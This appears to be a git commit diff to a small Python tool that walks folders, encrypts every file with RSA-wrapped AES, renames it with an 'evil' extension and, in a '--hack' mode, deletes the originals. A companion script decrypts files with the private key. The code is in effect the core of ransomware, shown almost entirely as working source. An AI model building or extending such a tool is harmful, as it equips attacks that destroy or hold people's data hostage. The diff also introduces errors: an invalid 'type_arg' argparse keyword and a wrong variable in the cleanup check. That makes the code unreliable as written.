a20bc33d0a2ed69e3042a49f302961f5992c6479
Пономарев Дмитрий Александрович <da_ponomarev@bingo-boom.com>
2018-11-09 13:55:38 +0300

    Fixed bugs on reopen non-encrypted files, add mask argument(-m).

--- decrypt_files.py
+++ decrypt_files.py
@@ -9,9 +9,14 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 PRIVATE_KEY = "private_key.bin"
 PATH = "path"
 FILE = "file"
+MASK = "evil"
 
-def decrypto_file(file_name, arg_password, clean_mode):
-    print('Source file: ', file_name, "--> ", file_name[:-4])
+def decrypto_file(file_name, arg_password, clean_mode, mask):
+    _mask = MASK
+    if mask:
+        _mask = mask
+
+    print('Source file: ', file_name, "--> ", file_name[:-(len(_mask) + 1)])
     with open(file_name, 'rb') as fobj:
         private_key = RSA.import_key(
             open(PRIVATE_KEY).read(),
@@ -21,18 +26,23 @@ def decrypto_file(file_name, arg_password, clean_mode):
             fobj.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1)
         ]
         fobj.close()
-        if (clean_mode == 1):
-            os.remove(file_name)
+        if clean_mode == 1:
+            if file_name[-(len(mask) + 1):] == mask:
+                os.remove(file_name)
             
         cipher_rsa = PKCS1_OAEP.new(private_key)
-        session_key = cipher_rsa.decrypt(enc_session_key)
-        
-        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
-        
-        create_decrypt_file(cipher_aes.decrypt_and_verify(ciphertext, tag), file_name)
+        try:
+            session_key = cipher_rsa.decrypt(enc_session_key)
+        except:
+            print("Failed to decrypt file!")
+            return
+        else:
+            cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
+            
+            create_decrypt_file(cipher_aes.decrypt_and_verify(ciphertext, tag), file_name, _mask)
 
-def create_decrypt_file(data, file_name):
-    file_decrypt = open(file_name[:-4], "wb")
+def create_decrypt_file(data, file_name, _mask):
+    file_decrypt = open(file_name[:-(len(_mask) + 1)], "wb")
     file_decrypt.write(data)
     file_decrypt.close()
 
@@ -44,34 +54,40 @@ def list_files_path(path_folder):
             
     return list_files
 
-def type_search_files(type, arg_parse, arg_password, clean_mode):
-    if (type == PATH):
-        for file in list_files_path(arg_parse):
-            decrypto_file(file, arg_password, clean_mode)
+def type_search_files(type_arg, path_files, arg_password, clean_mode, mask):
+    if type_arg == PATH:
+        list_files = list_files_path(path_files)
+        if not list_files:
+            print("File or directory is empty or not exists.")
+            return
 
-    if (type == FILE):
-        decrypto_file(arg_parse, arg_password, clean_mode)
+        for file in list_files:
+            decrypto_file(file, arg_password, clean_mode, mask)
+
+    if type_arg == FILE:
+        decrypto_file(path_files, arg_password, clean_mode, mask)
 
 def args_parser(args):
-    if (args.clean):
+    if args.clean:
         clean_mode = 1
     else:
         clean_mode = 0
 
-    if ((not args.p) and (not args.f) and (not args.pw)):
+    if not args.p and not args.f and not args.pw:
         print("Args is empty, try --help.")
 
     if args.p:
-        type_search_files(PATH, args.p, args.pw, clean_mode)
+        type_search_files(PATH, args.p, args.pw, clean_mode, args.m)
 
     if args.f:
-        type_search_files(FILE, args.f, args.pw, clean_mode)
+        type_search_files(FILE, args.f, args.pw, clean_mode, args.m)
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='This is app for crypt files.')
-    parser.add_argument('-p', type=str, help='Path to folder with files.')
-    parser.add_argument('-f', type=str, help='Path to file.')
-    parser.add_argument('-pw', type=str, help='Password to decrypt files.')
+    parser.add_argument('-p', type_arg=str, help='Path to folder with files.')
+    parser.add_argument('-f', type_arg=str, help='Path to file.')
+    parser.add_argument('-m', type_arg=str, help='Mask to decrypt files.')
+    parser.add_argument('-pw', type_arg=str, help='Password to decrypt files.')
     parser.add_argument('--clean', action='store_true', help='Delete sources encryptions files.')
     args_parser(parser.parse_args())
--- encrypt_files.py
+++ encrypt_files.py
@@ -6,12 +6,12 @@ from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-MASK = ".lul"
+MASK = "evil"
 PUBLIC_KEY = "public_key.pem"
 PATH = "path"
 FILE = "file"
 
-def open_file(path_file, hack_mode):
+def open_file(path_file, hack_mode, mask):
     try:
         file_to_crypt = open(path_file, "rb")
     except:
@@ -19,14 +19,18 @@ def open_file(path_file, hack_mode):
     else:
         data = file_to_crypt.read()
         file_to_crypt.close()
-        if (hack_mode == 1):
+        if hack_mode == 1:
             os.remove(path_file)
 
-        crypto_file(path_file, data)
+        crypto_file(path_file, data, mask)
 
-def crypto_file(path_file, data):
-    print('Source file: ', path_file, "--> ", path_file + MASK)
-    with open(path_file + MASK, 'wb') as out_file:
+def crypto_file(path_file, data, mask):
+    _mask = MASK
+    if mask:
+        _mask = mask
+
+    print('Source file: ', path_file, "--> ", path_file + "."+ _mask)
+    with open(path_file + "." + _mask, 'wb') as out_file:
         recipient_key = RSA.import_key(open(PUBLIC_KEY).read())
             
         session_key = get_random_bytes(16)
@@ -48,33 +52,39 @@ def list_files_path(path_folder):
 
     return list_files
 
-def crypto_operation(type, arg_parse, hack_mode):
-    if (type == PATH):
-        for file in list_files_path(arg_parse):
-            open_file(file, hack_mode)
+def type_search_files(type_arg, path_files, hack_mode, mask):
+    if type_arg == PATH:
+        list_files = list_files_path(path_files)
+        if not list_files:
+            print("File or directory is empty or not exists.")
+            return
 
-    if (type == FILE):
-        open_file(arg_parse, hack_mode)
+        for file in list_files:
+            open_file(file, hack_mode, mask)
+
+    if type_arg == FILE:
+        open_file(path_files, hack_mode, mask)
 
 def args_parser(args):
-    if (args.hack):
+    if args.hack:
         hack_mode = 1
     else:
         hack_mode = 0
 
-    if ((not args.p) and (not args.f)):
+    if not args.p and not args.f:
         print("Args is empty, try --help.")
 
     if args.p:
-        crypto_operation(PATH, args.p, hack_mode)
+        type_search_files(PATH, args.p, hack_mode, args.m)
 
     if args.f:
-        crypto_operation(FILE, args.f, hack_mode)
+        type_search_files(FILE, args.f, hack_mode, args.m)
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='This is app for crypt files.')
-    parser.add_argument('-p', type=str, help='Path to folder with files.')
-    parser.add_argument('-f', type=str, help='Path to file.')
+    parser.add_argument('-p', type_arg=str, help='Path to folder with files.')
+    parser.add_argument('-f', type_arg=str, help='Path to file.')
+    parser.add_argument('-m', type_arg=str, help='Mask for encryption file.')
     parser.add_argument('--hack', action='store_true', help='Activate Hack mode :DDD (Source files will be deleted!)')
     args_parser(parser.parse_args())
